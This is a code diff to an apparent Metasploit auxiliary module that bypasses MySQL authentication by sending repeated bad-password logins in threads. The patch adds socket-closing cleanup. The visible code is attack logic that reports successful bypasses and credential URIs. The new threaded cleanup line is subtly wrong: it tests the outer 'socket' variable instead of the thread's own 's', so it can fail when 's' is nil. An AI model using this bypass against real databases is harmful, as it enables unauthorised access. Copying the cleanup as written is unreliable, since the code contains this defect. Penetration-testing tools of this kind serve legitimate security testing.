@@ -61,8 +61,10 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       socket = connect(false)
+      close_required = true
       mysql_client = ::Mysql.connect(rhost, username, password, nil, rport, io: socket)
       results << mysql_client
+      close_required = false
 
       print_good "#{rhost}:#{rport} The server accepted our first login as #{username} with a bad password. URI: mysql://#{username}:#{password}@#{rhost}:#{rport}"
 
@@ -76,6 +78,8 @@ class MetasploitModule < Msf::Auxiliary
     rescue ::Exception => e
       print_error "#{rhost}:#{rport} Error: #{e}"
       return
+    ensure
+      socket.close if socket && close_required
     end
 
     # Short circuit if we already won
@@ -112,14 +116,18 @@ class MetasploitModule < Msf::Auxiliary
         t = Thread.new(item) do |count|
           begin
             # Create our socket and make the connection
+            close_required = true
             s = connect(false)
             mysql_client = ::Mysql.connect(rhost, username, password, nil, rport, io: s)
 
             print_good "#{rhost}:#{rport} Successfully bypassed authentication after #{count} attempts. URI: mysql://#{username}:#{password}@#{rhost}:#{rport}"
             results << mysql_client
+            close_required = false
           rescue ::Mysql::AccessDeniedError
           rescue ::Exception => e
             print_bad "#{rhost}:#{rport} Thread #{count}] caught an unhandled exception: #{e}"
+          ensure
+            s.close if socket && close_required
           end
         end
 
